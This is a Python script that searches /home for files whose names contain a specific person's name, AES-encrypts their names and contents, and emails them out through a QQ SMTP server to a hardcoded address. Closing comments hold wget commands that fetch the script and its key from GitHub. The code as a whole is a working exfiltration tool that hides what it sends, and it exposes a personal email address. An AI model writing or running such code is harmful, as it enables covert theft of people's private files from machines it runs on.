import os
import base64
import smtplib
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.header import Header
from email import encoders
from email.utils import parseaddr, formataddr
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as PKCS1_cipher
from Crypto.Cipher import AES
from binascii import b2a_hex


def getAesKey():
	with open('aeskey.txt','r') as f:
		rsa_text = f.read()
	# 使用私钥对内容进行rsa解密
	with open('private_key.rsa') as f:
		key = f.read()
		pri_key = RSA.importKey(key)
		cipher = PKCS1_cipher.new(pri_key)
		back_text = cipher.decrypt(base64.b64decode(rsa_text), 0)
		aeskey = back_text.decode('utf-8')
		# print(aeskey)
		return aeskey
		

# aes  加密 
def aesEncrypt(message):
	key = getAesKey()
	mode = AES.MODE_OFB
	cryptor = AES.new(key.encode('utf-8'), mode, b'0000000000000000')
	length = 16
	count = len(message)
	if count % length != 0:
	    add = length - (count % length)
	else:
	    add = 0
	message = message + ('\0' * add)
	ciphertext = cryptor.encrypt(message.encode('utf-8'))
	result = b2a_hex(ciphertext)
	# print(result.decode('utf-8'))
	return result.decode('utf-8')


def scanFile():
	g = os.walk(r"/home")
	nameList = []
	for path,dir_list,file_list in g:
		for file_name in file_list:
			if "李硕"in file_name:
				#print(path+"/"+file_name)
				fileName = path+"/"+file_name
				nameList.append(fileName)
	return nameList

#print(scanFile())

def _format_addr(s):
    name, addr = parseaddr(s)
    return formataddr((Header(name, 'utf-8').encode(), addr))


def encryptSend():
	from_addr = "1827108135@qq.com"
	password = "*******"
	#to_addr = "shilishuoya@gmail.com"
	to_addr = "1827108135@qq.com"
	smtp_server = "smtp.qq.com"

	# 邮件对象:
	msg = MIMEMultipart()
	#msg = MIMEText('hello, the file as follows...', 'plain', 'utf-8')
	msg['From'] = _format_addr('Server <%s>' % from_addr)
	msg['To'] = _format_addr('Master <%s>' % to_addr)
	msg['Subject'] = Header('Some Text……', 'utf-8').encode()
	msg.attach(MIMEText('hello, the file as follows...', 'plain', 'utf-8'))

	#附件
	files = scanFile()
	for txtFile in files:
		with open(txtFile, 'rb') as f:
		# 添加附件就是加上一个MIMEBase，从本地读取一个文件:
		# with open('李硕.txt', 'rb') as f:
    		# 设置附件的MIME和文件名，这里是text类型:
			mime = MIMEBase('text', 'plain', filename=aesEncrypt(txtFile))
			# 加上必要的头信息:
			mime.add_header('Content-Disposition', 'attachment', filename=aesEncrypt(txtFile))
			mime.add_header('Content-ID', '<0>')
			mime.add_header('X-Attachment-Id', '0')
			# 把附件的内容读进来:
			mime.set_payload(aesEncrypt(f.read().decode()))
			# 用Base64编码:
			encoders.encode_base64(mime)
			# 添加到MIMEMultipart:
			msg.attach(mime)


	server = smtplib.SMTP(smtp_server, 25)
	server.set_debuglevel(1)
	server.login(from_addr, password)
	server.sendmail(from_addr, [to_addr], msg.as_string())
	server.quit()


if __name__ == "__main__":
	encryptSend()

# wget https://raw.githubusercontent.com/irving-11/forTest/master/sendFile.py
# wget https://raw.githubusercontent.com/irving-11/forTest/master/2.txt -O aeskey.txt
